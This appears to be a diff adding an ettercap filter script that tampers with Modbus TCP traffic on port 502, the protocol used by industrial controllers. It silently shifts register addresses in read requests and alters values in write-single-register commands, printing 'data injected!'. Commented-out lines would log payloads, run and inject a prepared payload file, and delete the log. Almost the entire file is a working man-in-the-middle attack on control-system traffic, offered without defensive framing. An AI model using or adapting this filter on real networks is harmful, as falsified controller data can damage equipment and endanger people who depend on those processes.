@@ -1,0 +1,46 @@
+############################################################################
+#                                                                          #
+#  By Thiago Alves. based on code from ALoR & NaGA                         #
+#  Along with some help from Kev and jon.dmml                              #
+#  http://ettercap.sourceforge.net/forum/viewtopic.php?t=2833              #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+if (ip.proto == TCP && tcp.dst == 502) 
+{
+	if (DATA.data + 7 == 0x04)
+	{
+		#log(DATA.data, "/tmp/payload.file");
+		#msg("data logged!");
+		#drop();		
+		#exec("/tmp/changePayload");
+		#drop();
+		#msg("data injected!");
+		#inject("/tmp/payload_ready.file");
+		#exec("/bin/rm /tmp/payload.file");
+		#msg("log deleted!");
+
+		DATA.data + 9 -= 0x12;
+	}
+}
+
+if (ip.proto == TCP && tcp.dst == 502)
+{
+	if (DATA.data + 7 == 0x06)
+	{
+		if (DATA.data + 9 == 0x01)
+		{
+			DATA.data + 10 += 0x12;
+			msg("data injected!");
+		}
+		if (DATA.data + 9 == 0x02)
+		{
+			DATA.data + 10 += 0x12;
+			msg("data injected again!");
+		}
+	}
+}
